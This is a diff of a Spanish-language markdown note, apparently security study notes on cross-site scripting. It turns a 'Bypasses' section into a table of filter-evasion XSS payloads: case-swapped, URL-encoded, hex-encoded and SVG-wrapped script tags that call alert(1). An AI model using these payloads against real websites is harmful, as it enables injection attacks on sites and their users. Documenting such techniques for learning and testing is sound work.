@@ -85,15 +85,15 @@ etc...
 
 # ✋🏻 Bypasses
 
-Para bypassear algunas medidas débiles de seguridad, podemos realizar los siguientes bypasses:
+Estos son algunos bypasses básicos que podemos realizar:
 
-- **Mayúsculas**: `<SCRIPT>alert(1)</SCRIPT>`
-- **Mixto**: `<ScRiPt>alert(1)</sCrIpT>`
-- **URL encoding**: `%3Cscript%3E`
-- **Hex encoding**: `\x3cscript\x3e`
-- **SVG**: `<svg><script>alert(1)</script></svg>`
-
-Hay más técnicas, pero menos comunes.
+| **Técnica**               | **Payload / Ejemplo**                   |
+| ------------------------- | --------------------------------------- |
+| **Mayúsculas**            | `<SCRIPT>alert(1)</SCRIPT>`             |
+| **Mixto (Case Swapping)** | `<ScRiPt>alert(1)</sCrIpT>`             |
+| **URL Encoding**          | `%3Cscript%3Ealert(1)%3C/script%3E`     |
+| **Hex Encoding**          | `\x3cscript\x3ealert(1)\x3c/script\x3e` |
+| **SVG (Contexto XML)**    | `<svg><script>alert(1)</script></svg>`  |
 
 # 🔧 Herramientas
 
